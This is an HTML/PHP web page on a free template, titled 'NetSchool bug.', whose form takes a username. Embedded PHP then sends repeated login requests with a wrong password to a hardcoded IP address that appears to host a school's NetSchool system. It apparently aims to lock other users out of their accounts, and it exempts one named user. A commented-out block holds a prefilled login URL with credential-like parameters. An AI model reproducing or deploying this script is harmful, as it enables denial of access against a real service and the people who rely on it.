 <!-- FlatFy Theme - Andrea Galanti /-->
<!doctype html>
<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en"> <![endif]-->
<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en"> <![endif]-->
<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en"> <![endif]-->
<!--[if IE 9]>    <html class="no-js ie9" lang="en"> <![endif]-->
<!--[if gt IE 9]><!--> <html> <!--<![endif]-->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
    <meta name="description" content="Flatfy Free Flat and Responsive HTML5 Template ">
    <meta name="author" content="">

    <title>Top4ek</title>

    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
 
    <!-- Custom Google Web Font -->
    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <link href='http://fonts.googleapis.com/css?family=Lato:100,300,400,700,900,100italic,300italic,400italic,700italic,900italic' rel='stylesheet' type='text/css'>
	<link href='http://fonts.googleapis.com/css?family=Arvo:400,700' rel='stylesheet' type='text/css'>
	
    <!-- Custom CSS-->
    <link href="css/general.css" rel="stylesheet">
	
	 <!-- Owl-Carousel -->
    <link href="css/custom.css" rel="stylesheet">
	<link href="css/owl.carousel.css" rel="stylesheet">
    <link href="css/owl.theme.css" rel="stylesheet">
	<link href="css/style.css" rel="stylesheet">
	<link href="css/animate.css" rel="stylesheet">
	
	<!-- Magnific Popup core CSS file -->
	<link rel="stylesheet" href="css/magnific-popup.css"> 
	
	<script src="js/modernizr-2.8.3.min.js"></script>  <!-- Modernizr /-->
	<!--[if IE 9]>
		<script src="js/PIE_IE9.js"></script>
	<![endif]-->
	<!--[if lt IE 9]>
		<script src="js/PIE_IE678.js"></script>
	<![endif]-->

	<!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
	<![endif]-->

</head>

<body id="home">

	<!-- Preloader -->
	<div id="preloader">
		<div id="status"></div>
	</div>
	
	<!-- FullScreen -->
    <div class="intro-header">
		<div class="col-xs-12 text-center abcen1">
			<h1 class="h1_home wow fadeIn" data-wow-delay="0.4s">NetSchool bug.</h1>
<form action="#" style="padding-bottom: 5%;" method="POST">
	 <input style="color: black;" type="text" name="id" placeholder="Login"> 
	<button class="btn  btn-lg btn-danger fadeIn" type="submit">Login</button>
<?/*
			<form action="http://78.140.18.5/asp/postlogin.asp?VER=569591111&PW2=80f612124d106504dd28441e011b1fc9&LT=973175705&LoginType=1&ECardID&CID=2&SID=70&PID=-1&CN=3&SFT=2&SCID=1&UN=&#1040;&#1087;&#1083;&#1080;&#1085;&PW=80f612" style="padding-bottom: 5%;">
	<!-- <input style="color: black;" type="text" name="id" placeholder="Введите логин"> -->
	<button class="btn  btn-lg btn-danger fadeIn" type="submit">Login</button>
</form>
*/
?>
<?
$i = 1;
$id = ucfirst($_POST['id']);
if($id != "Аплин"){
while ($i < 4){
file_get_contents("http://78.140.18.5/asp/postlogin.asp?VER=561135576&PW2=689538051d2bac96f94b56b340e39e8d&LT=563612852&LoginType=1&ECardID&CID=2&SID=70&PID=-1&CN=3&SFT=2&SCID=1&UN=".$id."&PW=68953898123");
$i++;
}}
$id = lcfirst($_POST['id']);
if($id != "Аплин"){
while ($i < 4){
file_get_contents("http://78.140.18.5/asp/postlogin.asp?VER=561135576&PW2=689538051d2bac96f94b56b340e39e8d&LT=563612852&LoginType=1&ECardID&CID=2&SID=70&PID=-1&CN=3&SFT=2&SCID=1&UN=".$id."&PW=68953898123");
$i++;
}}
?>
		</div>    
        <!-- /.container -->
    </div>
    <!-- JavaScript -->
    <script src="js/jquery-1.10.2.js"></script>
    <script src="js/bootstrap.js"></script>
	<script src="js/owl.carousel.js"></script>
	<script src="js/script.js"></script>
	<!-- StikyMenu -->
	<script src="js/stickUp.min.js"></script>
	<script type="text/javascript">
	  jQuery(function($) {
		$(document).ready( function() {
		  $('.navbar-default').stickUp();
		  
		});
	  });
	
	</script>
	<!-- Smoothscroll -->
	<script type="text/javascript" src="js/jquery.corner.js"></script> 
	<script src="js/wow.min.js"></script>
	<script>
	 new WOW().init();
	</script>
	<script src="js/classie.js"></script>
	<script src="js/uiMorphingButton_inflow.js"></script>
	<!-- Magnific Popup core JS file -->
	<script src="js/jquery.magnific-popup.js"></script> 
</body>
</html>
